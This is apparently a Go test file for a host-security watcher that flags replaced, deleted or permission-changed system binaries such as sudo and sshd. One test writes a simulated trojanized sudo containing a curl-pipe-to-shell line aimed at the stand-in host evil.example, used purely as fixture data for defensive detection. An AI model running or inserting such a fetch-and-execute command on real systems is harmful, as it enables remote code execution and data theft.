package hostsec

import (
	"os"
	"path/filepath"
	"testing"

	"vanguard/core/internal/database"
)

func writeBinary(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0755); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

func TestBinaryIntegrityWatcher_FirstScanIsSilent(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	dir := t.TempDir()
	target := filepath.Join(dir, "sudo")
	writeBinary(t, target, "#!/bin/sh\necho original\n")

	w := NewBinaryIntegrityWatcher(db, rep, []string{target})
	w.Scan(bg())

	if len(rep.findings) != 0 {
		t.Fatalf("expected 0 findings on cold-start seeding scan, got %d: %+v", len(rep.findings), rep.findings)
	}
}

func TestBinaryIntegrityWatcher_DetectsReplacedBinary(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	dir := t.TempDir()
	target := filepath.Join(dir, "sudo")
	writeBinary(t, target, "#!/bin/sh\necho original\n")

	w := NewBinaryIntegrityWatcher(db, rep, []string{target})
	w.Scan(bg()) // seed

	// Simulate an attacker replacing the binary with a trojanized version.
	writeBinary(t, target, "#!/bin/sh\ncurl http://evil.example/exfil | sh\necho original\n")
	rep.reset()
	w.Scan(bg())

	got := rep.byChange("modified")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'modified' finding, got %d: %+v", len(got), rep.findings)
	}
	if got[0].Type != database.IncidentSystemBinaryIntegrity {
		t.Errorf("expected type %s, got %s", database.IncidentSystemBinaryIntegrity, got[0].Type)
	}

	// Stable re-scan must not re-fire.
	rep.reset()
	w.Scan(bg())
	if len(rep.findings) != 0 {
		t.Fatalf("expected 0 findings on stable re-scan, got %d: %+v", len(rep.findings), rep.findings)
	}
}

func TestBinaryIntegrityWatcher_DetectsDeletedBinary(t *testing.T) {
	db := testDB(t)
	rep := &fakeReporter{}
	dir := t.TempDir()
	target := filepath.Join(dir, "sshd")
	writeBinary(t, target, "#!/bin/sh\necho sshd\n")

	w := NewBinaryIntegrityWatcher(db, rep, []string{target})
	w.Scan(bg())

	if err := os.Remove(target); err != nil {
		t.Fatalf("remove: %v", err)
	}
	rep.reset()
	w.Scan(bg())

	got := rep.byChange("deleted")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'deleted' finding, got %d: %+v", len(got), rep.findings)
	}
}

func TestBinaryIntegrityWatcher_DetectsPermChange(t *testing.T) {
	skipIfNoUnixPerms(t) // needs Unix mode bits / ownership; run on Linux
	db := testDB(t)
	rep := &fakeReporter{}
	dir := t.TempDir()
	target := filepath.Join(dir, "su")
	writeBinary(t, target, "#!/bin/sh\necho su\n")

	w := NewBinaryIntegrityWatcher(db, rep, []string{target})
	w.Scan(bg())

	if err := os.Chmod(target, 0777); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	rep.reset()
	w.Scan(bg())

	got := rep.byChange("perm_changed")
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 'perm_changed' finding, got %d: %+v", len(got), rep.findings)
	}
}

func TestBinaryIntegrityWatcher_IsNotCriticalByDefault(t *testing.T) {
	// Unlike FIM's shadow/authorized_keys special-case, System Binary
	// Integrity has no criticalPaths configured -- every change is
	// reported at the base severity (HIGH tier via risk.BaseSeverity),
	// not auto-escalated to Critical.
	db := testDB(t)
	rep := &fakeReporter{}
	dir := t.TempDir()
	target := filepath.Join(dir, "passwd")
	writeBinary(t, target, "v1\n")

	w := NewBinaryIntegrityWatcher(db, rep, []string{target})
	w.Scan(bg())
	writeBinary(t, target, "v2\n")
	rep.reset()
	w.Scan(bg())

	if len(rep.findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(rep.findings))
	}
	if rep.findings[0].Critical {
		t.Errorf("expected Critical=false for a generic system-binary change, got true")
	}
}
